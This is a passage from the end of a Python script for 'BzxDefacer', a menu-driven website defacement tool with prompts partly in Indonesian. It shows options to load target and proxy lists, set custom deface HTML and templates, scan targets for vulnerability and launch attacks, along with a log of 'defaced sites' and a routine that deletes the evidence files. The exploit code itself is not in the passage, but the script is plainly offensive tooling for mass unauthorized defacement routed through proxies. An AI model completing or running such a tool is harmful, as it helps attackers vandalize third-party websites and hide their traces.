        print(f"{G}Success: {self.success}{RS}")
        print(f"{R}Failed: {self.failed}{RS}")
        print(f"{G}Live targets: {len(self.live_targets)}{RS}")
        print(f"{C}═══════════════════════════════════════{RS}")
        print(f"{Y}Log disimpan di defaced.log{RS}")
        
        input(f"\n{Y}Press Enter untuk kembali...{RS}")
    
    def view_logs(self):
        """Lihat hasil deface"""
        try:
            with open('defaced.log', 'r') as f:
                logs = f.readlines()
            
            print(f"\n{C}══════════════════ HASIL DEFACE ══════════════════{RS}")
            if logs:
                for i, log in enumerate(logs[-20:], 1):
                    print(f"{G}{i}. {log.strip()}{RS}")
                print(f"{Y}Total: {len(logs)} defaced sites{RS}")
            else:
                print(f"{Y}[!] Belum ada log{RS}")
        except:
            print(f"{R}[!] File log tidak ditemukan{RS}")
        
        input(f"\n{Y}Press Enter...{RS}")
    
    def clean_cache(self):
        """Bersihin file temporary"""
        files = ['defaced.log', 'vulnerable.txt', 'custom.html', 'template_*.html']
        for pattern in files:
            if '*' in pattern:
                os.system(f"rm -f {pattern}")
            else:
                try:
                    os.remove(pattern)
                except:
                    pass
        print(f"{G}[✓] Cache & temp files cleaned{RS}")
        time.sleep(1)

def main():
    defacer = BzxDefacer()
    
    while True:
        defacer.show_menu()
        choice = input(f"{Y}Pilih menu [0-12]: {RS}").strip()
        
        if choice == '1':
            file = input(f"{Y}File target list (targets.txt): {RS}").strip() or 'targets.txt'
            defacer.load_targets(file)
            input(f"\n{Y}Press Enter...{RS}")
            
        elif choice == '2':
            defacer.auto_proxy_menu()
            
        elif choice == '3':
            file = input(f"{Y}File proxy (proxies.txt): {RS}").strip() or 'proxies.txt'
            defacer.load_proxies(file)
            input(f"\n{Y}Press Enter...{RS}")
            
        elif choice == '4':
            defacer.custom_html_menu()
            
        elif choice == '5':
            defacer.template_menu()
            
        elif choice == '6':
            defacer.settings_menu()
            
        elif choice == '7':
            defacer.scan_targets()
            
        elif choice == '8':
            defacer.run()
            
        elif choice == '9':
            defacer.view_logs()
            
        elif choice == '10':
            defacer.proxy_status_menu()
            
        elif choice == '11':
            defacer.clean_cache()
            
        elif choice == '12':
            defacer.input_target_manual()
            
        elif choice == '0':
            print(f"{R}[!] Exiting...{RS}")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] User interrupt{RS}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{RS}")
